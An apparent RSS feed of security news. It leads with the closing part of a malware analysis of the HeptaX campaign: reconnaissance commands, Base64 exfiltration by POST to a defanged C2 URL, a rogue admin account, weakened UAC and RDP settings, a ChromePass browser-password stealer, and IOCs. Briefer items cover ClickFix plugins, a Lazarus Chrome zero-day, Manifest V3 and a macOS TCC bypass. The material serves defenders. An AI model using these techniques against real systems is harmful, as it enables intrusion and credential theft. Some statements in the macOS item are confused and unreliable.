<p>The script then utilizes a WebClient to send a request and retrieve commands from the server. Upon receiving a response, it checks for the presence of the string "autoreconnect id." If this string is found, the PowerShell script executes the code in the current session using iex; otherwise, it runs the code as a background task in a separate PowerShell process. Notably, in both stages, we did not receive any specific commands such as "autoreconnect" or "autoreconnect id". The main difference in this sixth-stage script is that it looks for the string "autoreconnect id" instead of just "autoreconnect". The below image shows the code for reconnecting to the server.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69383,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="C2, malware" class="wp-image-69383" src="https://cyble.com/wp-content/uploads/2024/10/Figure-19-Reconnecting-to-the-CC-server.png" /><figcaption class="wp-element-caption">Figure 19 - Reconnecting to the C&amp;C server</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Seventh Stage – Server response PowerShell Script</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Upon establishing a connection with the server, a new PowerShell script is executed. This script contains several functions aimed at system reconnaissance, data exfiltration, and interaction with the remote server.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The script collects detailed system information, including:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Computer name and username.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Retrieves recent files from the directory: <em>C:\Users\&lt;user profile>\AppData\Roaming\Microsoft\Windows\Recent</em>.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Acquires network configuration details using “ipconfig /all”.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>List of users on the machine (net user).</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Obtains current logged-in user details.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Identifies local user groups associated with the current user.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Retrieves excluded directories in Windows Defender.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Lists installed antivirus products.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Captures running processes using “tasklist”.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Gathers overall system information using “systeminfo”.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>All this data is saved in a log file located at “<em>C:\Windows\Temp\OneDriveLog\OneDrive.log”</em>.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>The script then reads the contents of the log file, converts the data into a byte array, and encodes it in Base64 format. This encoded data, along with the unique user ID (uid), is appended to the base URL” <em>hxxp://157.173.104[.]153/up/index.php</em>” and sent via a POST request. After successfully transmitting the data, the log file and its directory are deleted to eliminate any traces of the data collection.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69385,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="POST, Script" class="wp-image-69385" src="https://cyble.com/wp-content/uploads/2024/10/Figure-20-–-Script-partial-content-for-making-POST-request.png" /><figcaption class="wp-element-caption">Figure 20 – Script partial content for making a POST request</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Taking Remote desktop</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>With all the collected information, User Account Control (UAC) disabled, and a new user account named “<em>BootUEFI</em>” created with administrative privileges, along with lowered authentication requirements for Terminal Services, the TAs can easily gain access to the compromised remote desktop. This access enables them to perform various actions on the victim's machine, such as:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Installing additional malware</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Exfiltrating sensitive data</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Monitoring user activity</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Modifying system settings</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Utilizing the machine for malicious activities</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, we observed an unwanted application—a hacking tool named ChromePass—associated with the same network infrastructure at “<em>hxxp://157.173.104[.]153/up/Tool/ChromePass.exe</em>” This tool is designed to steal saved passwords from Chromium-based browsers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Over the past year, this group has executed multiple attacks utilizing various lures and targeting different victims, all while remaining largely unnoticed. Their reliance on basic scripts has enabled TAs to gain remote access to compromised systems seamlessly, allowing for extensive exploitation without triggering alarms.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, the deployment of the ChromePass tool further underscores the group’s intent to harvest sensitive information, such as saved passwords from Chromium-based browsers, thereby posing a significant threat to the security of individuals and organizations alike. This combination of tactics highlights the need for enhanced detection and prevention measures to combat these stealthy <a href="https://cyble.com/knowledge-hub/what-are-cyber-threats/">cyber threats</a> effectively.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The initial breach may occur via spam emails. Therefore, it’s advisable to deploy strong email filtering systems to identify and prevent the dissemination of harmful attachments.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Exercise caution when handling email attachments or links, particularly those from unknown senders. Verify the sender’s identity, particularly if an email seems suspicious.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Consider disabling the execution of shortcut files (.lnk) from email attachments or implementing policies that require explicit user consent before executing such files.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Consider disabling or limiting the execution of scripting languages, such as PowerShell and cmd.exe, on user workstations and servers if they are not essential for legitimate purposes.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Implement policies that prevent the unauthorized creation of privileged accounts.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Regularly track changes to User Account Control (UAC)- related registry keys, such as “EnableLUA” and “ConsentPromptBehaviorAdmin.” Monitoring these keys helps identify potential attempts to bypass UAC, enhancing system protection against unauthorized changes.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Strengthen the security of Remote Desktop Protocol (RDP) by enforcing strong authentication mechanisms, such as <a href="https://cyble.com/blog/multi-factor-authentication-mfa-is-a-part-of-your-cyber-hygiene/">multi-factor authentication</a> (MFA), and by using network-level authentication (NLA). Limiting RDP access to trusted IP addresses and utilizing VPNs can also help mitigate risks.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Set up network-level monitoring to detect unusual activities or data exfiltration by malware. Block suspicious activities to prevent potential breaches.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">MITRE ATT&amp;CK® Techniques</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Tactic</strong></td>
<td><strong>Technique</strong></td>
<td><strong>Procedure</strong></td>
</tr>
<tr>
<td>Initial Access (<a href="https://attack.mitre.org/tactics/TA0001/">TA0001</a>)</td>
<td>Phishing (<a href="https://attack.mitre.org/techniques/T1566/" rel="noreferrer noopener" target="_blank">T1566</a>)</td>
<td>The LNK file may be delivered through phishing or spam emails</td>
</tr>
<tr>
<td>Execution (<a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank">TA0002</a>)</td>
<td>User Execution:&nbsp; Malicious Link (<a href="https://attack.mitre.org/versions/v14/techniques/T1204/001/" rel="noreferrer noopener" target="_blank">T1204.001</a>)&nbsp; &nbsp; Command and Scripting Interpreter: PowerShell (<a href="https://attack.mitre.org/techniques/T1059/001/" rel="noreferrer noopener" target="_blank">T1059.001</a>)</td>
<td>&nbsp; Execution begins when a user executes the LNK file &nbsp; &nbsp; The LNK file executes PowerShell commands</td>
</tr>
<tr>
<td>Defense Evasion&nbsp;<a href="https://attack.mitre.org/tactics/TA0005/" rel="noreferrer noopener" target="_blank">(TA0005)</a>&nbsp;</td>
<td>Obfuscated Files or &nbsp;<br />Information (<a href="https://attack.mitre.org/techniques/T1027/" rel="noreferrer noopener" target="_blank">T1027</a>)&nbsp; &nbsp;</td>
<td>Scripts include packed or encrypted data.</td>
</tr>
<tr>
<td>Persistence (<a href="https://attack.mitre.org/tactics/TA0003/" rel="noreferrer noopener" target="_blank">TA0003</a>)</td>
<td>Boot or Logon Autostart Execution:&nbsp;Registry Run Keys / Startup Folder (<a href="https://attack.mitre.org/techniques/T1547/001/" rel="noreferrer noopener" target="_blank">T1547.001</a>)</td>
<td>Adds LNK file in the startup folder</td>
</tr>
<tr>
<td>Privilege &nbsp;<br />Escalation&nbsp;<br /><a href="https://attack.mitre.org/tactics/TA0004/" rel="noreferrer noopener" target="_blank">(TA0004)</a>&nbsp;</td>
<td>Abuse Elevation Control&nbsp;&nbsp;Mechanism (<a href="https://attack.mitre.org/techniques/T1548/" rel="noreferrer noopener" target="_blank">T1548</a>)&nbsp; &nbsp; Account Manipulation (<a href="https://attack.mitre.org/techniques/T1098/">T1098</a>)</td>
<td>Bypass User Account Control&nbsp; &nbsp; &nbsp; Manipulate accounts to maintain and/or elevate access to victim systems.</td>
</tr>
<tr>
<td>Discovery (<a href="https://attack.mitre.org/tactics/TA0007/" rel="noreferrer noopener" target="_blank">TA0007</a>)</td>
<td>System Information Discovery (<a href="https://attack.mitre.org/techniques/T1082" rel="noreferrer noopener" target="_blank">T1082</a>)</td>
<td>Script gathers system information.</td>
</tr>
<tr>
<td>Credential Access (<a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank">TA0006</a>)</td>
<td>Credentials from Password Stores: Credentials from Web Browsers (<a href="https://attack.mitre.org/techniques/T1555/003/" rel="noreferrer noopener" target="_blank">T1555.003</a>)&nbsp;</td>
<td>Retrieves credentials from web browsers&nbsp;</td>
</tr>
<tr>
<td>C&amp;C&nbsp;<br /><a href="https://attack.mitre.org/tactics/TA0011/" rel="noreferrer noopener" target="_blank">(TA0011)</a>&nbsp;</td>
<td>Ingress Tool Transfer&nbsp;<br />(<a href="https://attack.mitre.org/techniques/T1105/" rel="noreferrer noopener" target="_blank">T1105</a>)&nbsp;</td>
<td>Downloads files from webservers via &nbsp;<br />HTTP&nbsp;</td>
</tr>
<tr>
<td>C&amp;C&nbsp;<br /><a href="https://attack.mitre.org/tactics/TA0011/" rel="noreferrer noopener" target="_blank">(TA0011)</a>&nbsp;</td>
<td>Application Layer Protocol&nbsp;<br />(<a href="https://attack.mitre.org/techniques/T1071/" rel="noreferrer noopener" target="_blank">T1071</a>)&nbsp;</td>
<td>Malware exe communicate to C&amp;C server.&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Indicators Of Compromise</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Indicators</strong><strong> </strong></td>
<td><strong>Indicator Type</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>6605178dbc4d84e789e435915e86a01c5735f34b7d18d626b2d8810456c4bc72</td>
<td>SHA256</td>
<td>Zip File</td>
</tr>
<tr>
<td>18e75bababa1176ca1b25f727c0362e4bb31ffc19c17e2cabb6519e6ef9d2fe5 5ff89db10969cba73d1f539b12dad42c60314e580ce43d7b57b46a1f915a6a2b</td>
<td>SHA256</td>
<td>Malicious LNK file</td>
</tr>
<tr>
<td>1d82927ab19db7e9f418fe6b83cf61187d19830b9a7f58072eedfd9bdf628dab</td>
<td>SHA256</td>
<td>bb.ps1</td>
</tr>
<tr>
<td>a8d577bf773f753dfb6b95a3ef307f8b4d9ae17bf86b95dcbb6b2fb638a629b9</td>
<td>SHA256</td>
<td>b.ps1</td>
</tr>
<tr>
<td>999f521ac605427945035a6d0cd0a0847f4a79413a4a7b738309795fd21d3432</td>
<td>SHA256</td>
<td>K1.bat</td>
</tr>
<tr>
<td>4b127e7b83148bfbe56bd83e4b95b2a4fdb69e1c9fa4e0c021a3bfb7b02d8a16</td>
<td>SHA256</td>
<td>GooglePass</td>
</tr>
<tr>
<td>hxxp://157.173.104[.]153/up/index.php hxxp://157[.]173.104.153/up/b.ps1 hxxp://157.173.104[.]153/up/bb.ps1 hxxp://157.173.104[.]153/up/scheduler-oncex<br />hxxp://157.173.104[.]153/up/trigger<br />hxxp://157.173.104[.]153/up/Tool/ChromePass.exe<br />hxxp://157.173.104[.]153/up/get-command.php<br />hxxp://157.173.104[.]153/up/bait/202409_Resident_Care_Quality_Improvement_Strategies_for_Nursing_Homes_Enhancing_Patient_Satisfaction_and_Health_Outcomes.pdf</td>
<td>URL</td>
<td>Remote server</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">References</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>https://twitter.com/malwrhunterteam/status/1701669714244542758</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>https://twitter.com/AzakaSekai_/status/1846482785009348692</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>https://twitter.com/fmc_nan/status/1701427951714345296</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>https://twitter.com/malwrhunterteam/status/1708219656488571188</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>https://twitter.com/malwrhunterteam/status/1701672325580550176</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/heptax-unauthorized-rdp-connections-for-cyberespionage-operations/" rel="nofollow">HeptaX: Unauthorized RDP Connections for Cyberespionage Operations</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Fri, 25 Oct 2024 14:57:26 +0000</pubDate>
</item>
<item>
<title>Infostealer-Injecting Plugins infect Thousands of WordPress Sites</title>
<link>https://www.cysecurity.news/2024/10/infostealer-injecting-plugins-infect.html</link>
<guid>https://www.cysecurity.news/2024/10/infostealer-injecting-plugins-infect.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSUjiWQ6Myxc5ltIGFHdkI45Oi4prx50T2mf0dhyrTPkuaQsPDF3g-Z4ghlz9_q-4H7ezpyD0kd7KtPfQdTgLnBYoL-YHNphK-h3Rcbd2nXqLRHzOIoyvkGH02Ec2ItLIHL-XY0utrnyMrxmVyFu88Anb4kKXvwgIh3KZyPJT6Kp4WTzlX30yoq0Z3xco/s1920/1710.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSUjiWQ6Myxc5ltIGFHdkI45Oi4prx50T2mf0dhyrTPkuaQsPDF3g-Z4ghlz9_q-4H7ezpyD0kd7KtPfQdTgLnBYoL-YHNphK-h3Rcbd2nXqLRHzOIoyvkGH02Ec2ItLIHL-XY0utrnyMrxmVyFu88Anb4kKXvwgIh3KZyPJT6Kp4WTzlX30yoq0Z3xco/s600/1710.jpg" width="600" /></a></div><span style="font-family: inherit;"><div style="text-align: justify;"><span style="font-family: inherit;">Hackers are using WordPress sites to install malicious plugins that propagate malware that steals information by displaying fake updates and errors.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Infostealing malware has become a global nuisance for security defenders in recent years, as compromised credentials are used to infiltrate networks and steal data.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Since 2023, a malicious campaign known as ClearFake has been used to display bogus web browser update banners on compromised sites that spread data-stealing malware.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">A new campaign named ClickFix was launched in 2024; it is quite similar to ClearFake, but it poses as software error warnings with fixes included. These "fixes" are actually PowerShell scripts that, when executed, will download and install malware that steals data.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">This year has seen a rise in ClickFix attacks, in which threat actors hack websites to show banners displaying fake issues for Facebook, Google Meet conferences, Google Chrome, and even captcha pages.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><b>Malicious WordPress plugins</b></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Last week, GoDaddy disclosed that the ClearFake/ClickFix threat actors had infiltrated over 6,000 WordPress sites, installing malicious plugins that displayed the fake alerts associated with these operations.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">"The GoDaddy Security team is tracking a new&nbsp;</span><span style="font-family: inherit;">variant of ClickFix (also known as ClearFake) fake browser update malware that is distributed via bogus WordPress plugins," notes GoDaddy security researcher Denis Sinegubko. "These seemingly legitimate plugins are designed to appear harmless to website administrators but contain embedded malicious scripts that deliver fake browser update prompts to end-users.”&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Sucuri, a website security firm, has also identified a fraudulent plugin called "Universal Popup Plugin" as part of this operation. When installed, the malicious plugin will hook into various WordPress activities, depending on the type, and inject a malicious JavaScript script into the site's HTML.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Sinegubko's analysis of web server access logs indicates that the threat actors are using stolen admin credentials to enter into the WordPress site and install the plugin in an automated manner. Threat actors log in with a single POST HTTP request rather than first accessing the site's login page. This shows that the process is automated after the credentials have been received.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Although it's unknown how the threat actors are getting the credentials, the researcher points out that it might be through information-stealing malware, phish</span><span style="font-family: inherit;">ing, and brute force attempts in the past.</span></div></span>
]]></content:encoded>
<pubDate>2024-10-24T12:35:27.402-04:00</pubDate>
</item>
<item>
<title>Lazarus Group Exploits Google Chrome Vulnerability to Control Infected Devices</title>
<link>https://thehackernews.com/2024/10/lazarus-group-exploits-google-chrome.html</link>
<guid>https://thehackernews.com/2024/10/lazarus-group-exploits-google-chrome.html</guid>
<content:encoded><![CDATA[
The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a now-patched security flaw in Google Chrome to seize control of infected devices.
Cybersecurity vendor Kaspersky said it discovered a novel attack chain in May 2024 that targeted the personal computer of an unnamed Russian national with the Manuscrypt backdoor.
This entails triggering the
]]></content:encoded>
<pubDate>Thu, 24 Oct 2024 15:23:00 +0530</pubDate>
</item>
<item>
<title>Lazarus hackers used fake DeFi game to exploit Google Chrome zero-day</title>
<link>https://www.bleepingcomputer.com/news/security/lazarus-hackers-used-fake-defi-game-to-exploit-google-chrome-zero-day/</link>
<guid>https://www.bleepingcomputer.com/news/security/lazarus-hackers-used-fake-defi-game-to-exploit-google-chrome-zero-day/</guid>
<content:encoded><![CDATA[
The North Korean Lazarus hacking group exploited a Google Chrome zero-day tracked as CVE-2024-4947 through a fake decentralized finance (DeFi) game targeting individuals in the cryptocurrency space. [...]
]]></content:encoded>
<pubDate>Wed, 23 Oct 2024 14:03:49 -0400</pubDate>
</item>
<item>
<title>Google to let businesses create curated Chrome Web Stores for extensions</title>
<link>https://www.bleepingcomputer.com/news/google/google-to-let-businesses-create-curated-chrome-web-stores-for-extensions/</link>
<guid>https://www.bleepingcomputer.com/news/google/google-to-let-businesses-create-curated-chrome-web-stores-for-extensions/</guid>
<content:encoded><![CDATA[
Google has announced it will soon allow organizations to create their own curated "Enterprise Web Store" of company-sanctioned browser extensions for Chrome and ChromeOS, aimed at improving productivity, security, and management for businesses. [...]
]]></content:encoded>
<pubDate>Wed, 23 Oct 2024 12:01:47 -0400</pubDate>
</item>
<item>
<title>The Impact of Google’s Manifest V3 on Chrome Extensions</title>
<link>https://www.cysecurity.news/2024/10/the-impact-of-googles-manifest-v3-on.html</link>
<guid>https://www.cysecurity.news/2024/10/the-impact-of-googles-manifest-v3-on.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div style="text-align: justify;"><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-zs5ymF-x8GWz3UIhKh_QX74Waug5hiOf7FlbOpzdMWIWAUAvQHWzX5AO4M325MTJw0_Y5gZ_bPwxN90AiZnESo1yczQKaWArB-O0gwjlzPIfW7cZ_RvjBIzdjtRF3RksbmRF3iBM9er7AdbPSD78l9SF61CcWltMLKtWc3p43YZGcxcS4eraxOF-Lqs/s1280/search-engine-76519_1280.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-zs5ymF-x8GWz3UIhKh_QX74Waug5hiOf7FlbOpzdMWIWAUAvQHWzX5AO4M325MTJw0_Y5gZ_bPwxN90AiZnESo1yczQKaWArB-O0gwjlzPIfW7cZ_RvjBIzdjtRF3RksbmRF3iBM9er7AdbPSD78l9SF61CcWltMLKtWc3p43YZGcxcS4eraxOF-Lqs/s600/search-engine-76519_1280.png" width="600" /></a></div>Google’s Manifest V3 rules have generated a lot of discussion, primarily because users fear it will make ad blockers, such as Ublock Origin, obsolete. This concern stems from the fact that Ublock Origin is heavily used and has been affected by these changes. However, it’s crucial to understand that these new rules don’t outright disable ad blockers, though they may impact some functionality.

The purpose of Manifest V3 is to enhance the security and privacy of Chrome extensions. A significant part of this is limiting remote code execution within extensions, a measure meant to prevent malicious activities that could lead to data breaches.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This stems from incidents like DataSpii, where extensions harvested sensitive user data including tax returns and financial information. Google’s Manifest V3 aims to prevent such vulnerabilities by introducing stricter regulations on the code that can be used within extensions.

For developers, this means adapting to new APIs, notably the WebRequest API, which has been altered to restrict certain network activities that extensions used to perform. While these changes are designed to increase user security, they require extension developers to modify how their tools work. Ad blockers like Ublock Origin can still function, but some users may need to manually enable or adjust settings to get them working effectively under Manifest V3.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Although many users believe that the update is intended to undermine ad blockers—especially since Google’s main revenue comes from ads—the truth is more nuanced. Google maintains that the changes are intended to bolster security, though skepticism remains high. Users are still able to use ad blockers such as Ublock Origin or switch to alternatives like Ublock Lite, which complies with the new regulations. Additionally, users can choose other browsers like Firefox that do not have the same restrictions and can still run extensions under their older, more flexible frameworks.

While Manifest V3 introduces hurdles, it doesn’t spell the end for ad blockers. The changes force developers to ensure that their tools follow stricter security protocols, but this could ultimately lead to safer browsing experiences.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">If some extensions stop working, alternatives or updates are available to address the gaps. For now, users can continue to enjoy ad-free browsing with the right tools and settings, though they should remain vigilant in managing and updating their extensions.

To further protect themselves, users are advised to explore additional options such as using privacy-focused extensions like Privacy Badger or Ghostery. For more tech-savvy individuals, setting up hardware-based ad-blocking solutions like Pi-Hole can offer more comprehensive protection. A virtual private network (VPN) with built-in ad-blocking capabilities is another effective solution.

Ultimately, while Manifest V3 may introduce limitations, it’s far from the end of ad-blocking extensions.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Developers are adapting, and users still have a variety of tools to block intrusive ads and enhance their browsing experience. Keeping ad blockers up to date and understanding how to manage extensions is key to ensuring a smooth transition into Google’s new extension framework.</div>
]]></content:encoded>
<pubDate>2024-10-23T11:09:43.823-04:00</pubDate>
</item>
<item>
<title>HM Surf Bug in macOS Raises Data Privacy Concerns</title>
<link>https://www.cysecurity.news/2024/10/hm-surf-bug-in-macos-raises-data.html</link>
<guid>https://www.cysecurity.news/2024/10/hm-surf-bug-in-macos-raises-data.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZbywA8qayZtyi7djUM2WX-it_cO9j_1E_iavz-5FlvKPwx5_5MlV-jIBrRSHsTgamM9rFsXjVrr0EC4ZiDS81gOY3CFXc__SltZQlqH413AYOFnguAyFQLFWaEWwzrAK_kHNjR3_A2jCWXKqB2W1VdJvWOl5rjQ4B3UGR2DgNnQt3-_EKrm10s2IxjFiI/s4857/pexels-abdullah-bin-mubarak-2067629-3693732.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="426" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZbywA8qayZtyi7djUM2WX-it_cO9j_1E_iavz-5FlvKPwx5_5MlV-jIBrRSHsTgamM9rFsXjVrr0EC4ZiDS81gOY3CFXc__SltZQlqH413AYOFnguAyFQLFWaEWwzrAK_kHNjR3_A2jCWXKqB2W1VdJvWOl5rjQ4B3UGR2DgNnQt3-_EKrm10s2IxjFiI/w640-h426/pexels-abdullah-bin-mubarak-2067629-3693732.jpg" width="640" /></a></div><br /><p></p><div style="text-align: justify;">Several vulnerabilities in the Safari web browser for macOS may have left users open to being spied on, having their data stolen, and acquiring other types of malware thanks to this security weakness.

Specifically, the vulnerability arises from the special permissions Apple gives to its proprietary apps, and here, it is the browser, as well as the ease with which an attacker can obtain the important configuration files of an app.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Ultimately, what it allows a user to do is to circumvent the Transparency, Consent, and Control (TCC) security layer on MacBooks that is designed to safeguard sensitive data from an attacker. CVE-2024-44133 has been rated as a "medium" severity vulnerability by the Common Vulnerability Scoring System (CVSS), meaning that it has a 5.5 severity score as per the CVSS.

According to the CVE-2024-44133 vulnerability report, attackers can bypass the user data protection methods implemented by the operating system by bypassing Transparency, Consent, and Control (TCC).&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">During the September 16 update for Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac Mini (2018 and later), MacBook Air (2020 and later), MacBook Pro (2018 and later), and iMac Pro (2017 and later), the vulnerability, also referred to as CVE-2024-44133, had been fixed.

Please take note that this vulnerability will only impact devices that are managed by Mobile Device Management (MDM), not any other device. Typically, MDM managed devices are subject to policies and procedures set by the IT department of an organization, which is responsible for centrally managing and maintaining the devices.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">According to Microsoft, the flaw has been named "HM Surf." By exploiting this vulnerability an attacker would be able to bypass macOS' Transparency, Consent, and Control (TCC) features and gain unauthorized access to a user's protected data, which they would have no control over.

There is a possibility users may discover Safari's TCC in action while browsing a website that requires access to the camera or microphone when browsing through the website.

It was noted by Apple in mid-September that a bug in macOS Sequoia 15 has been fixed by removing the vulnerable code. However, the bug does not seem to affect MDM-managed devices.

As stated in the blog post, Microsoft’s Sequoia 15 release only protects Apple’s Safari web browser when it is installed.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">It was also pointed out that browsers like Google Chrome and Mozilla Firefox don't have the same private entitlements as Apple applications, so they cannot bypass TCC checks like Apple applications can. Therefore, once TCC checks are approved, it is up to the app to maintain access to the privacy database as long as people have approved the checks.

This vulnerability can be exploited by removing the TCC protection for the Safari browser directory and editing a configuration file in that directory. It is stated in Microsoft's response that it involves gaining access to the user's data, such as browsed pages, the camera, microphone, and location of the device, without the user's knowledge.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Users of macOS are strongly encouraged to apply these security updates as soon as possible so that their system will be protected. Using its behavior monitoring capabilities, Microsoft Defender for Endpoint has detected activities associated with Adload, one of the most prevalent macOS threat families, which may be exploiting this vulnerability in some way. In addition to detecting and blocking CVE-2024-44133 exploitation, Windows Defender for Endpoint also detects and blocks anomalous modifications of the Preferences file through HM Surf or other mechanisms that potentially exploit the vulnerability.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">According to Microsoft, it was TCC technology that first enabled them to learn how to bypass the technology when they discovered powerdir's vulnerability. Please remember that TCC, as its name implies, is a technology that prevents apps from accessing users' personal information when they are installed and that this includes services such as location services, camera and microphone devices, download directories, and others, without the user's knowledge or consent.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In the world of mobile applications, the only legal way 